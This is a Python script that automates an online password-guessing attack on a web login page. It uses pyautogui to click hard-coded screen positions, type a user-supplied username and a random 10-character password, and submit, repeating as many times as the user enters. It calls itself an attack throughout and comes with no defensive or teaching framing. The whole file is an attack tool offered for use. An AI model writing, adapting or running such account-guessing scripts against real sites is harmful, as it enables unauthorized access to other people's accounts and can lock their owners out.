import webbrowser,random,string,time
import pyautogui as gui

def passgen():
    password=''
    for i in range(10):
        x=random.randint(0,94)
        password+=string.printable[x]
    return password
if __name__=="__main__":
    print("Starting the attack.")
    
    #Enter site url here
    url="Login page url"

    webbrowser.open(url)
    print("Url opened is: {}".format(url))
    time.sleep(3)

    """"
    Here ux = username x coordinate, uy = username y coordinate
         px = password x coordinate, py = password y coordinate
         lx = login button x coordinate, ly = login button x coordinate
         Change them as per your site.
    """

    ux,uy,px,py,lx,ly=580,429,562,478,581,576
    n=int(input("Enter the number of times to attack: "))
    uname=input("Enter the username: ")
    print("Go again to the browser. You have 5 seconds.")
    time.sleep(5)
    print("Attacking the account: ")
    for i in range(n):

        if(i==0):
            #Enter the first time page coordinates
            ux,uy,px,py,lx,ly=580,429,562,478,581,576
        else:
            #Enter the next time page coordinates
            ux,uy,px,py,lx,ly=573,510,564,557,575,658
            
        password = passgen()
        gui.click(ux,uy)
        gui.press("backspace",presses=13)
        gui.typewrite(uname)
        time.sleep(1)
        gui.press("tab")
        gui.press("backspace",presses=13)
        gui.typewrite(password)
        time.sleep(1)
        gui.click(lx,ly)
        time.sleep(2)
    print("Attack Completed Successfully.")